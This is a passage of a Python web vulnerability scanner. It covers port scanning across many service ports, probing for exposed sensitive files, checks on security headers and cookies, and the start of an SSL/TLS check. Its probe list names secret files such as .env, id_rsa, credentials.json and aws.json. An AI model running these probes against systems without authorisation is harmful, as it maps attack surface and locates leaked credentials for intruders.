            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Attempt to connect to the port
            result = sock.connect_ex((self.target_host, port))
            sock.close()
            
            if result == 0:  # Port is open
                # Get service name if known
                service_name = self.service_names.get(port, 'Unknown')
                
                if self.verbose and self.logger:
                    self.logger.info(f"Port {port} is open ({service_name})")
                
                return port, True, service_name
            
            return port, False, None
        
        except socket.error as e:
            if self.logger:
                self.logger.error(f"Error scanning port {port}: {str(e)}")
            return None
        except Exception as e:
            if self.logger:
                self.logger.error(f"Unexpected error scanning port {port}: {str(e)}")
            return None
    
    def _get_ports_to_scan(self):
        """
        Determine which ports to scan based on scan depth.
        
        Returns:
            list: List of port numbers to scan
        """
        # Common important ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 8080, 8443]
        
        # Extended set of ports
        extended_ports = common_ports + [
            20, 79, 111, 135, 161, 389, 636, 1025, 1434, 2049, 2082, 2083, 2181, 2222, 
            3000, 3128, 5000, 5060, 5601, 5900, 5984, 6379, 7001, 7002, 8000, 8089, 8888, 
            9000, 9090, 9200, 9300, 10000, 11211, 27017, 27018, 27019, 50070
        ]
        
        # Full scan adds port ranges
        if self.depth == 1:
            return common_ports
        elif self.depth == 2:
            return extended_ports
        else:  # depth > 2
            # More comprehensive port list
            additional_ports = list(range(1, 1025))  # Privileged ports
            additional_ports += [1027, 1028, 1029, 1050, 1080, 1099, 1241, 1337, 1440, 2000, 2001, 2301, 3333, 4000, 4001, 4002, 4100, 4200, 4243, 4443, 4444, 4567, 4711, 4712, 4713, 4714, 4715, 4716, 4717, 4718, 4719, 4720, 4730, 4731, 4732, 4733, 4734, 4735, 4736, 4737, 4738, 4739, 4740, 4750, 4760, 4761, 4762, 4763, 4764, 4765, 4766, 4767, 4768, 4769, 4770, 4771, 4772, 4773, 4774, 4775, 4776, 4777, 4778, 4779, 4780, 4790, 4800, 4801, 4802, 4803, 4804, 4805, 4806, 4807, 4808, 4809, 4810, 4820, 4830, 4840, 4841, 4842, 4843, 4844, 4845, 4846, 4847, 4848, 4849, 4850, 4851, 4852, 4853, 4854, 4855, 4856, 4857, 4858, 4859, 4860, 4870, 4871, 4872, 4873, 4874, 4875, 4876, 4877, 4878, 4879, 4880, 4881, 4882, 4883, 4884, 4885, 4886, 4887, 4888, 4889, 4890, 4900, 4910, 4911, 4912, 4913, 4914, 4915, 4916, 4917, 4918, 4919, 4920, 4921, 4922, 4923, 4924, 4925, 4926, 4927, 4928, 4929, 4930, 4931, 4932, 4933, 4934, 4935, 4936, 4937, 4938, 4939, 4940, 4941, 4942, 4943, 4944, 4945, 4946, 4947, 4948, 4949, 4950, 4951, 4952, 4953, 4954, 4955, 4956, 4957, 4958, 4959, 4960, 4970, 4971, 4972, 4973, 4974, 4975, 4976, 4977, 4978, 4979, 4980, 4981, 4982, 4983, 4984, 4985, 4986, 4987, 4988, 4989, 4990, 4991, 4992, 4993, 4994, 4995, 4996, 4997, 4998, 4999, 5001, 5002, 5003, 5004, 5005, 5006, 5007, 5008, 5009, 5010, 5020, 5030, 5040, 5050, 5060, 5070, 5080, 5081, 5082, 5083, 5084, 5085, 5086, 5087, 5088, 5089, 5090, 5100, 5200, 5300, 5400, 5500, 5600, 5700, 5800, 5900, 5901, 5902, 5903, 6000, 6001, 6002, 6003, 6004, 6005, 6006, 6007, 6008, 6009, 6010, 6020, 6030, 6040, 6050, 6060, 6070, 6080, 6090, 6100, 6110, 6112, 6129, 6200, 6300, 6400, 6500, 6600, 6700, 6800, 6900, 7000, 7010, 7070, 7100, 7200, 7300, 7400, 7500, 7600, 7700, 7800, 7900, 8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009, 8010, 8020, 8030, 8040, 8050, 8060, 8070, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8100, 8110, 8200, 8300, 8400, 8443, 8500, 8600, 8700, 8800, 8880, 8888, 8900, 9000, 9001, 9002, 9003, 9004, 9005, 9006, 9007, 9008, 9009, 9010, 9020, 9030, 9040, 9050, 9060, 9070, 9080, 9090, 9100, 9200, 9300, 9400, 9500, 9600, 9700, 9800, 9900, 10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009, 10010, 10020, 10030, 10040, 10050, 10060, 10070, 10080, 10090, 10100, 10200, 10300, 10400, 10500, 10600, 10700, 10800, 10900, 11000, 11100, 11200, 11300, 12000, 12345, 13000, 14000, 15000, 16000, 17000, 18000, 19000, 20000, 25000, 30000, 35000, 40000, 45000, 50000, 55000, 60000]
            # Add the additional ports to the extended set
            return list(set(extended_ports + additional_ports))
    
    def scan(self):
        """
        Start the port scanning process.
        
        Returns:
            list: List of open port vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting port scan on {self.target_host}")
        
        try:
            # Get the list of ports to scan
            ports_to_scan = self._get_ports_to_scan()
            
            if self.verbose and self.logger:
                self.logger.info(f"Scanning {len(ports_to_scan)} ports on {self.target_host}")
            
            # Perform the scan with multi-threading if more than 20 ports
            if len(ports_to_scan) > 20:
                with concurrent.futures.ThreadPoolExecutor(max_workers=min(50, len(ports_to_scan))) as executor:
                    scan_results = list(filter(None, executor.map(self._scan_port, ports_to_scan)))
            else:
                # For fewer ports, scan sequentially
                scan_results = list(filter(None, map(self._scan_port, ports_to_scan)))
            
            # Process results
            open_ports = [r for r in scan_results if r[1]]  # Filter to only open ports
            
            for port, _, service_name in open_ports:
                # Create a vulnerability entry for each open port
                detail = f"Port {port} ({service_name}) is open on {self.target_host}"
                
                # Determine severity based on the service
                severity = 'Low'  # Default severity
                
                # Higher risk services get medium or high severity
                high_risk_services = ['RDP', 'Telnet', 'FTP', 'SMB', 'RPC', 'MongoDB', 'Redis', 'MSSQL', 'Oracle', 'MySQL', 'PostgreSQL']
                medium_risk_services = ['SSH', 'SMTP', 'DNS', 'VNC', 'POP3', 'IMAP', 'NetBIOS']
                
                if service_name in high_risk_services:
                    severity = 'High'
                elif service_name in medium_risk_services:
                    severity = 'Medium'
                
                # For HTTP/HTTPS services, typically lower severity unless non-standard port
                if service_name in ['HTTP', 'HTTPS'] and port not in [80, 443, 8080, 8443]:
                    severity = 'Medium'
                
                vulnerability = {
                    'type': 'Open Port',
                    'host': self.target_host,
                    'port': port,
                    'service': service_name,
                    'details': detail,
                    'severity': severity,
                    'recommendation': "Close unnecessary ports and implement proper firewall rules"
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Open port found: {detail}")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during port scan: {str(e)}")
        
        if self.logger:
            self.logger.info(f"Completed port scan, found {len(vulnerabilities)} open ports")
        
        return vulnerabilities

###########################################
# SENSITIVE FILES SCANNER
###########################################

class SensitiveFileScanner:
    """Scanner for detecting sensitive or backup files on the server."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the Sensitive File scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Scan depth level (more files as depth increases)
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.depth = depth
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # Basic common files to check for
        self.common_files = [
            # Web configuration files
            ".htaccess",
            ".htpasswd",
            "web.config",
            "robots.txt",
            "sitemap.xml",
            "crossdomain.xml",
            
            # Environment files
            ".env",
            ".env.backup",
            ".env.bak",
            "env.php",
            "process.env",
            
            # PHP config/info files
            "config.php",
            "config.php.bak",
            "config.inc.php",
            "database.php",
            "settings.php",
            "setup.php",
            "php.ini",
            "info.php",
            "phpinfo.php",
            
            # CMS specific files
            "wp-config.php",
            "wp-config.php.bak",
            "wp-config.php~",
            "wp-config.php.save",
            "configuration.php",  # Joomla
            "joomla.xml",
            "Drupal.zip",
            
            # Developer mistakes
            "debug.php",
            "test.php",
            "test.html",
            "test.txt",
            "install.php",
            "INSTALL.txt",
            "INSTALL.md",
            "install.txt",
            "install.log",
            
            # Backup files
            "backup.zip",
            "backup.sql",
            "backup.tar.gz",
            "dump.sql",
            "database.sql",
            "database.sql.gz",
            "data.sql",
            "backup/",
            
            # Server-side logs
            "access.log",
            "error.log",
            "server.log",
            "logs/",
            
            # Version control
            ".git/HEAD",
            ".git/config",
            ".svn/entries",
            ".svn/all-wcprops",
            ".hg/",
            ".gitlab-ci.yml",
            ".travis.yml",
            
            # Documentation & Readme files
            "README.md",
            "README.txt",
            "CHANGELOG.md",
            "CHANGELOG.txt",
            "LICENSE.txt",
            "CONTRIBUTING.md",
            
            # Common misconfigurations
            "phpMyAdmin/",
            "phpmyadmin/",
            "admin/",
            "admin.php",
            "administrator/",
            "login.php",
            "wp-login.php",
            
            # API endpoints
            "api/",
            "v1/",
            "v2/",
            "swagger/",
            "swagger-ui.html",
            "api-docs/",
            
            # Docker/Kubernetes files
            "docker-compose.yml",
            "Dockerfile",
            "kubernetes.yaml",
            "deployment.yaml",
            
            # JavaScript files
            "package.json",
            "package-lock.json",
            "yarn.lock",
            
            # Python files
            "requirements.txt",
            "manage.py",  # Django
            
            # Temporary and editor files
            ".DS_Store",
            ".vscode/",
            ".idea/",
            "*.swp",
            "*.swo",
            "*~",
            
            # Server-specific files
            "web.xml",
            "server-status",
            "server-info",
            
            # Credentials & keys
            "credentials.json",
            "id_rsa",
            "id_rsa.pub",
            "id_dsa",
            "id_dsa.pub"
        ]
        
        # Additional files to check if depth > 1
        self.extended_files = [
            # Common file extensions with backup indicators
            ".php.bak", ".php~", ".php.old", ".php.swp", ".php.save",
            ".asp.bak", ".asp~", ".asp.old", ".asp.swp", ".asp.save",
            ".aspx.bak", ".aspx~", ".aspx.old", ".aspx.swp", ".aspx.save",
            ".js.bak", ".js~", ".js.old", ".js.swp", ".js.save", ".js.map",
            ".txt.bak", ".txt~", ".txt.old", ".txt.swp", ".txt.save",
            ".sql.bak", ".sql~", ".sql.old", ".sql.swp", ".sql.save",
            ".conf.bak", ".conf~", ".conf.old", ".conf.swp", ".conf.save",
            ".xml.bak", ".xml~", ".xml.old", ".xml.swp", ".xml.save",
            ".json.bak", ".json~", ".json.old", ".json.swp", ".json.save",
            
            # More config files
            "authorization.config",
            "global.asax",
            "applicationHost.config",
            ".htaccess.bak",
            ".htpasswd.bak",
            "httpd.conf",
            "nginx.conf",
            "server.conf",
            "sites-available/",
            
            # More detailed backup files
            "database_backup/",
            "db_backup/",
            "site_backup/",
            "www.zip",
            "www.tar.gz",
            "wwwdata.zip",
            "backup-latest.zip",
            "latest-dump.sql",
            "site-backup-[0-9]*.zip",
            
            # More complete version control exposure
            ".git/refs/heads/master",
            ".git/index",
            ".git/logs/",
            ".svn/wc.db",
            
            # More CMS specific files
            "wp-content/debug.log",
            "wp-content/uploads/",
            "wp-content/plugins/",
            "administrator/logs/",
            "typo3conf/",
            
            # Additional API and development files
            "api/swagger.json",
            "openapi.json",
            "api/spec",
            "graphql",
            "graphiql",
            ".eslintrc",
            "babel.config.js",
            "webpack.config.js",
            
            # Database files
            "*.sqlite",
            "*.sqlite3",
            "*.db",
            "dump.rdb",
            
            # Additional logs and debug
            "npm-debug.log",
            "yarn-debug.log",
            "debug.log",
            "nohup.out",
            
            # Configuration management
            "ansible.cfg",
            "puppet.conf",
            "chef.rb",
            "terraform.tfstate",
            
            # Additional credentials
            "secrets.yml",
            "credentials.yml",
            "config/credentials/",
            "aws.json",
            "aws-config.json",
            
            # Infrastructure
            "nginx/",
            "apache/",
            "redis/",
            "mysql/",
            "postgres/"
        ]
    
    def _construct_file_paths(self):
        """
        Construct file paths to test based on the target URL.
        
        Returns:
            list: List of file paths to check
        """
        parsed_url = urlparse(self.target_url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        
        # Path components from the URL
        path_parts = [p for p in parsed_url.path.split('/') if p]
        
        test_paths = []
        
        # Base web root tests
        for file_path in self.common_files:
            test_url = f"{base_url}/{file_path}"
            test_paths.append(test_url)
        
        # Add extended files if depth allows
        if self.depth > 1:
            for file_path in self.extended_files:
                test_url = f"{base_url}/{file_path}"
                test_paths.append(test_url)
                
            # Also try files in direct subdirectories if URL includes a path
            if path_parts:
                # Get possible parent directories from the URL path
                current_path = ""
                for part in path_parts:
                    current_path += f"/{part}"
                    parent_url = f"{base_url}{current_path}"
                    
                    # Try common files in this directory
                    for file_path in self.common_files:
                        test_url = f"{parent_url}/{file_path}"
                        test_paths.append(test_url)
                    
                    # Only add extended files to the first level for performance
                    if current_path == f"/{path_parts[0]}" and self.depth > 2:
                        for file_path in self.extended_files:
                            test_url = f"{parent_url}/{file_path}"
                            test_paths.append(test_url)
        
        # Add aggressive file path tests if depth allows
        if self.depth > 2:
            # Template for derived paths
            if path_parts:
                # Try to derive possible sensitive paths from the URL structure
                # For example, if URL has /admin/users, check for /admin/config, /admin/backup, etc.
                if len(path_parts) > 1:
                    parent_dir = f"{base_url}/{path_parts[0]}"
                    interesting_suffixes = ["config", "backup", "settings", "admin", "setup", "install", "db", "test"]
                    
                    for suffix in interesting_suffixes:
                        test_url = f"{parent_dir}/{suffix}"
                        test_paths.append(test_url)
                        test_paths.append(f"{test_url}/")
        
        # Remove duplicates
        test_paths = list(set(test_paths))
        
        if self.verbose and self.logger:
            self.logger.info(f"Generated {len(test_paths)} file paths to check")
        
        return test_paths
    
    def _check_file_exists(self, url):
        """
        Check if a file exists on the server.
        
        Args:
            url (str): The URL to check
            
        Returns:
            tuple: (url, status_code, content_length, content_type) if file exists, None otherwise
        """
        try:
            response = requests.head(
                url, 
                headers=self.headers, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Some servers don't support HEAD requests correctly, fallback to GET
            if response.status_code >= 400:
                response = requests.get(
                    url, 
                    headers=self.headers, 
                    timeout=self.timeout,
                    allow_redirects=False,
                    stream=True  # Use streaming to avoid downloading large files
                )
                # Just read a small part of the response to check content type
                content = next(response.iter_content(1024), b'')
                content_length = len(content)
                # Get the real content length if available in headers
                if 'Content-Length' in response.headers:
                    content_length = int(response.headers['Content-Length'])
            else:
                content_length = 0
                if 'Content-Length' in response.headers:
                    content_length = int(response.headers['Content-Length'])
            
            # Check status code - we consider 200-399 as "exists"
            if 200 <= response.status_code < 400:
                content_type = response.headers.get('Content-Type', 'unknown')
                
                if self.verbose and self.logger:
                    self.logger.info(f"Found {url} - Status: {response.status_code}, Length: {content_length}, Type: {content_type}")
                
                return url, response.status_code, content_length, content_type
            
            return None
            
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error checking {url}: {str(e)}")
            return None
    
    def _determine_severity(self, file_path, content_type):
        """
        Determine the severity level based on the file path and content type.
        
        Args:
            file_path (str): The file path
            content_type (str): The content type of the file
            
        Returns:
            str: Severity level (Critical, High, Medium, Low, Info)
        """
        # Critical files that likely contain credentials or sensitive info
        critical_files = [
            ".env", "config.php", "wp-config.php", "configuration.php", 
            "database.php", "settings.php", "id_rsa", "secrets.yml", "credentials"
        ]
        
        # High severity files that might contain sensitive info
        high_files = [
            "backup", "dump.sql", "database.sql", "sql", "htpasswd", 
            "access.log", "error.log", "server.log", "debug.log", ".git/", ".svn/"
        ]
        
        # Medium severity files that might give information about the system
        medium_files = [
            "phpinfo", "info.php", "test", "install", "setup", "admin", "api", 
            "swagger", "package.json", "robots.txt", "web.config", "htaccess"
        ]
        
        # Potentially interesting file types by MIME
        critical_types = ["application/x-httpd-php", "application/x-sh", "text/x-php"]
        high_types = ["application/sql", "application/x-sql", "application/octet-stream", "application/x-tar", "application/zip"]
        
        # Check if the file path contains any critical patterns
        for pattern in critical_files:
            if pattern in file_path.lower():
                return "Critical"
        
        # Check content type for critical patterns
        for pattern in critical_types:
            if pattern in content_type.lower():
                return "Critical"
        
        # Check for high severity patterns
        for pattern in high_files:
            if pattern in file_path.lower():
                return "High"
        
        # Check content type for high severity patterns
        for pattern in high_types:
            if pattern in content_type.lower():
                return "High"
        
        # Check for medium severity patterns
        for pattern in medium_files:
            if pattern in file_path.lower():
                return "Medium"
        
        # Default severity is low
        return "Low"
    
    def scan(self):
        """
        Start the sensitive file scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting sensitive file scan on {self.target_url}")
        
        # Generate file paths to test
        test_paths = self._construct_file_paths()
        
        if self.verbose and self.logger:
            self.logger.info(f"Testing {len(test_paths)} potential sensitive files")
        
        # Test each path for existence
        for test_url in test_paths:
            result = self._check_file_exists(test_url)
            if result:
                url, status_code, content_length, content_type = result
                
                # Extract the file path from the URL
                file_path = url.split('://', 1)[1].split('/', 1)[1] if '/' in url.split('://', 1)[1] else ""
                
                # Determine the severity
                severity = self._determine_severity(file_path, content_type)
                
                detail = f"Sensitive file found: {file_path}"
                vulnerability = {
                    'type': 'Sensitive File Exposure',
                    'url': url,
                    'file_path': file_path,
                    'status_code': status_code,
                    'content_length': content_length,
                    'content_type': content_type,
                    'details': detail,
                    'severity': severity,
                    'recommendation': "Remove or restrict access to sensitive files and use appropriate security controls"
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Sensitive file found: {url}")
        
        if self.logger:
            self.logger.info(f"Completed sensitive file scan, found {len(vulnerabilities)} files")
        
        return vulnerabilities

###########################################
# HTTP HEADERS SCANNER
###########################################

class HTTPHeaderScanner:
    """Scanner for detecting HTTP header security issues."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the HTTP Headers scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Request timeout in seconds
            depth (int): Not used for header scanning but required for consistency
            user_agent (str): User-Agent string to use in requests
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.headers = {'User-Agent': user_agent}
        self.logger = logger
        self.verbose = verbose
        
        # List of security headers to check for
        self.security_headers = {
            'Strict-Transport-Security': {
                'description': 'HTTP Strict Transport Security (HSTS) forces secure connections to the server',
                'recommendation': 'Add "Strict-Transport-Security: max-age=31536000; includeSubDomains" header',
                'severity': 'Medium'
            },
            'Content-Security-Policy': {
                'description': 'Content Security Policy prevents XSS and data injection attacks',
                'recommendation': 'Implement a Content Security Policy that restricts resource loading',
                'severity': 'Medium'
            },
            'X-Content-Type-Options': {
                'description': 'Prevents MIME-sniffing a response away from the declared content-type',
                'recommendation': 'Add "X-Content-Type-Options: nosniff" header',
                'severity': 'Medium'
            },
            'X-Frame-Options': {
                'description': 'Protects website against clickjacking attacks',
                'recommendation': 'Add "X-Frame-Options: DENY" or "X-Frame-Options: SAMEORIGIN" header',
                'severity': 'Medium'
            },
            'X-XSS-Protection': {
                'description': 'Enables XSS filtering in browser (deprecated in modern browsers in favor of CSP)',
                'recommendation': 'Add "X-XSS-Protection: 1; mode=block" header',
                'severity': 'Low'
            },
            'Referrer-Policy': {
                'description': 'Controls how much referrer information is included with requests',
                'recommendation': 'Add appropriate Referrer-Policy header like "strict-origin-when-cross-origin"',
                'severity': 'Low'
            },
            'Feature-Policy': {
                'description': 'Controls which browser features can be used (now renamed to Permissions-Policy)',
                'recommendation': 'Implement Feature-Policy or Permissions-Policy to restrict browser features',
                'severity': 'Low'
            },
            'Permissions-Policy': {
                'description': 'Controls which browser features and APIs can be used',
                'recommendation': 'Implement Permissions-Policy to restrict browser features',
                'severity': 'Low'
            },
            'Public-Key-Pins': {
                'description': 'HPKP pins a site to specific certificate keys (considered high risk, deprecated)',
                'recommendation': 'Consider using Certificate Transparency instead of HPKP',
                'severity': 'Info'
            },
            'Cache-Control': {
                'description': 'Directs browsers and CDNs on how to cache content',
                'recommendation': 'Use appropriate Cache-Control headers for sensitive content',
                'severity': 'Low'
            },
            'Clear-Site-Data': {
                'description': 'Clears browser data (cookies, storage, cache) for the website',
                'recommendation': 'Use Clear-Site-Data header on logout pages',
                'severity': 'Info'
            }
        }
        
        # Headers that might expose sensitive information
        self.sensitive_headers = {
            'Server': {
                'description': 'Reveals web server information',
                'recommendation': 'Remove or obscure the Server header',
                'severity': 'Low'
            },
            'X-Powered-By': {
                'description': 'Reveals technology/framework used by the web application',
                'recommendation': 'Remove the X-Powered-By header',
                'severity': 'Low'
            },
            'X-AspNet-Version': {
                'description': 'Reveals the ASP.NET version',
                'recommendation': 'Remove the X-AspNet-Version header',
                'severity': 'Low'
            },
            'X-AspNetMvc-Version': {
                'description': 'Reveals the ASP.NET MVC version',
                'recommendation': 'Remove the X-AspNetMvc-Version header',
                'severity': 'Low'
            },
            'X-Runtime': {
                'description': 'Reveals the application runtime',
                'recommendation': 'Remove the X-Runtime header',
                'severity': 'Low'
            },
            'X-Generator': {
                'description': 'Reveals the technology used to generate the page',
                'recommendation': 'Remove the X-Generator header',
                'severity': 'Low'
            },
            'X-Debug': {
                'description': 'Debug information may be disclosed',
                'recommendation': 'Remove the X-Debug header in production',
                'severity': 'Medium'
            }
        }
    
    def _analyze_cookie_security(self, cookies):
        """
        Analyze cookie security based on missing security attributes.
        
        Args:
            cookies (list): List of cookies from response
            
        Returns:
            list: Vulnerabilities found in cookies
        """
        vulnerabilities = []
        
        for cookie in cookies:
            cookie_name = cookie.name
            cookie_attrs = []
            
            # Check for Secure flag
            if not cookie.secure:
                cookie_attrs.append({
                    'name': 'Secure',
                    'description': 'Cookie not marked as Secure, allowing transmission over HTTP',
                    'recommendation': f'Add Secure flag to the {cookie_name} cookie',
                    'severity': 'Medium'
                })
            
            # Check for HttpOnly flag
            if not cookie.has_nonstandard_attr('HttpOnly'):
                cookie_attrs.append({
                    'name': 'HttpOnly',
                    'description': 'Cookie not marked as HttpOnly, allowing JavaScript access',
                    'recommendation': f'Add HttpOnly flag to the {cookie_name} cookie',
                    'severity': 'Medium'
                })
            
            # Check for SameSite attribute
            if not cookie.has_nonstandard_attr('SameSite'):
                cookie_attrs.append({
                    'name': 'SameSite',
                    'description': 'Cookie does not have SameSite attribute, making it vulnerable to CSRF attacks',
                    'recommendation': f'Add SameSite=Strict or SameSite=Lax to the {cookie_name} cookie',
                    'severity': 'Medium'
                })
            
            # Add findings for this cookie
            for attr in cookie_attrs:
                vulnerability = {
                    'type': 'Insecure Cookie',
                    'url': self.target_url,
                    'cookie': cookie_name,
                    'missing_attribute': attr['name'],
                    'details': attr['description'],
                    'recommendation': attr['recommendation'],
                    'severity': attr['severity']
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Insecure cookie '{cookie_name}': Missing {attr['name']} attribute")
        
        return vulnerabilities
    
    def _analyze_header_values(self, headers):
        """
        Analyze header values for potential security issues.
        
        Args:
            headers (dict): Response headers
            
        Returns:
            list: Vulnerabilities found in header values
        """
        vulnerabilities = []
        
        # Check for missing security headers
        for header_name, header_info in self.security_headers.items():
            if header_name not in headers:
                vulnerability = {
                    'type': 'Missing Security Header',
                    'url': self.target_url,
                    'header': header_name,
                    'details': header_info['description'],
                    'recommendation': header_info['recommendation'],
                    'severity': header_info['severity']
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Missing security header: {header_name}")
        
        # Check for information disclosure headers
        for header_name, header_info in self.sensitive_headers.items():
            if header_name in headers:
                vulnerability = {
                    'type': 'Information Disclosure',
                    'url': self.target_url,
                    'header': header_name,
                    'value': headers[header_name],
                    'details': header_info['description'],
                    'recommendation': header_info['recommendation'],
                    'severity': header_info['severity']
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning(f"Information disclosure header: {header_name}: {headers[header_name]}")
        
        # Additional checks for specific headers
        if 'Strict-Transport-Security' in headers:
            hsts_value = headers['Strict-Transport-Security']
            if 'max-age=' in hsts_value:
                try:
                    max_age = int(hsts_value.split('max-age=')[1].split(';')[0].strip())
                    if max_age < 31536000:  # Less than 1 year
                        vulnerability = {
                            'type': 'Weak Security Header',
                            'url': self.target_url,
                            'header': 'Strict-Transport-Security',
                            'value': hsts_value,
                            'details': 'HSTS max-age is less than 1 year, which is not sufficient',
                            'recommendation': 'Use a max-age of at least 31536000 seconds (1 year)',
                            'severity': 'Low'
                        }
                        vulnerabilities.append(vulnerability)
                        
                        if self.logger:
                            self.logger.warning(f"Weak HSTS header: max-age too low ({max_age})")
                except ValueError:
                    pass
            
            if 'includeSubDomains' not in hsts_value:
                vulnerability = {
                    'type': 'Weak Security Header',
                    'url': self.target_url,
                    'header': 'Strict-Transport-Security',
                    'value': hsts_value,
                    'details': 'HSTS does not include subdomains, which may expose them to attacks',
                    'recommendation': 'Add includeSubDomains directive to HSTS header',
                    'severity': 'Low'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning("Weak HSTS header: missing includeSubDomains directive")
        
        # Check Content-Security-Policy for 'unsafe-inline' or 'unsafe-eval'
        if 'Content-Security-Policy' in headers:
            csp_value = headers['Content-Security-Policy']
            if "unsafe-inline" in csp_value or "unsafe-eval" in csp_value:
                vulnerability = {
                    'type': 'Weak Security Header',
                    'url': self.target_url,
                    'header': 'Content-Security-Policy',
                    'value': csp_value,
                    'details': 'CSP contains unsafe-inline or unsafe-eval, which weakens its protection',
                    'recommendation': 'Avoid using unsafe-inline and unsafe-eval in CSP',
                    'severity': 'Medium'
                }
                vulnerabilities.append(vulnerability)
                
                if self.logger:
                    self.logger.warning("Weak CSP header: contains unsafe directives")
        
        return vulnerabilities
    
    def _check_ssl_redirect(self, headers, url):
        """
        Check if HTTP redirects to HTTPS properly.
        
        Args:
            headers (dict): Response headers
            url (str): The URL that was tested
            
        Returns:
            dict or None: Vulnerability if HTTP doesn't redirect to HTTPS, None otherwise
        """
        parsed_url = urlparse(url)
        if parsed_url.scheme == 'https':
            return None  # Already using HTTPS
        
        # Check for a redirect
        location = headers.get('Location')
        if not location:
            # No redirect found
            vulnerability = {
                'type': 'Insecure Protocol',
                'url': url,
                'protocol': 'HTTP',
                'details': 'Site does not redirect from HTTP to HTTPS',
                'recommendation': 'Implement HTTP to HTTPS redirection (301 Redirect)',
                'severity': 'Medium'
            }
            
            if self.logger:
                self.logger.warning("Insecure Protocol: No HTTP to HTTPS redirection")
            
            return vulnerability
        
        # Check if the redirect is to HTTPS
        if not location.startswith('https://'):
            vulnerability = {
                'type': 'Insecure Redirect',
                'url': url,
                'redirect_url': location,
                'details': 'Site redirects to non-HTTPS URL',
                'recommendation': 'Redirect to HTTPS version of the site',
                'severity': 'Medium'
            }
            
            if self.logger:
                self.logger.warning(f"Insecure Redirect: HTTP to non-HTTPS URL ({location})")
            
            return vulnerability
        
        return None
    
    def scan(self):
        """
        Start the HTTP header security scan.
        
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        if self.logger:
            self.logger.info(f"Starting HTTP header scan on {self.target_url}")
        
        try:
            # First check if using HTTPS
            parsed_url = urlparse(self.target_url)
            if parsed_url.scheme != 'https':
                # Construct HTTP URL for testing redirect
                http_url = f"http://{parsed_url.netloc}{parsed_url.path}"
                
                if self.verbose and self.logger:
                    self.logger.info(f"Testing HTTP to HTTPS redirection: {http_url}")
                
                try:
                    response = requests.get(
                        http_url,
                        headers=self.headers,
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    # Check if HTTP properly redirects to HTTPS
                    redirect_vuln = self._check_ssl_redirect(response.headers, http_url)
                    if redirect_vuln:
                        vulnerabilities.append(redirect_vuln)
                
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error checking HTTP to HTTPS redirection: {str(e)}")
            
            # Get actual target URL headers
            response = requests.get(
                self.target_url,
                headers=self.headers,
                timeout=self.timeout
            )
            
            # Check headers
            header_vulnerabilities = self._analyze_header_values(response.headers)
            vulnerabilities.extend(header_vulnerabilities)
            
            # Check cookies
            cookie_vulnerabilities = self._analyze_cookie_security(response.cookies)
            vulnerabilities.extend(cookie_vulnerabilities)
            
            if self.verbose and self.logger:
                self.logger.info(f"Found {len(vulnerabilities)} HTTP header vulnerabilities")
        
        except Exception as e:
            if self.logger:
                self.logger.error(f"Error during HTTP header scan: {str(e)}")
        
        return vulnerabilities

###########################################
# SSL/TLS SCANNER
###########################################

class SSLTLSScanner:
    """Scanner for SSL/TLS vulnerabilities with enhanced detection capabilities."""
    
    def __init__(self, target_url, timeout=10, depth=2, user_agent="WebScan/1.0.0", logger=None, verbose=False):
        """
        Initialize the SSL/TLS scanner.
        
        Args:
            target_url (str): The target URL to scan
            timeout (int): Socket timeout in seconds
            depth (int): Not used for SSL scanning but required for consistency
            user_agent (str): Not used for SSL scanning but required for consistency
            logger: Logger instance
            verbose (bool): Enable verbose output
        """
        self.target_url = target_url
        self.timeout = timeout
        self.logger = logger
        self.verbose = verbose
        self.headers = {'User-Agent': user_agent}
        
        # Parse the URL to get the hostname and port
        parsed_url = urlparse(target_url)
        self.hostname = parsed_url.netloc.split(':')[0]
        
        # Determine port based on scheme or explicit port in URL
        if ':' in parsed_url.netloc:
            self.port = int(parsed_url.netloc.split(':')[1])
        else:
            self.port = 443 if parsed_url.scheme == 'https' else 80
        
        # Map of vulnerable SSL/TLS protocol versions
        # Modern Python versions have removed SSLv2 and SSLv3 protocol constants
        # Using a dictionary with protocol names as keys instead of protocol constants
        self.vulnerable_protocols = {
            'SSLv2': {
                'name': 'SSLv2',
                'protocol': 'SSLv2',
                'severity': 'Critical',
                'description': 'SSLv2 is fundamentally broken and deprecated for over 20 years - DROWN Attack vulnerable',
                'recommendation': 'Disable SSLv2 on the server immediately',
                'cve': 'CVE-2016-0800'
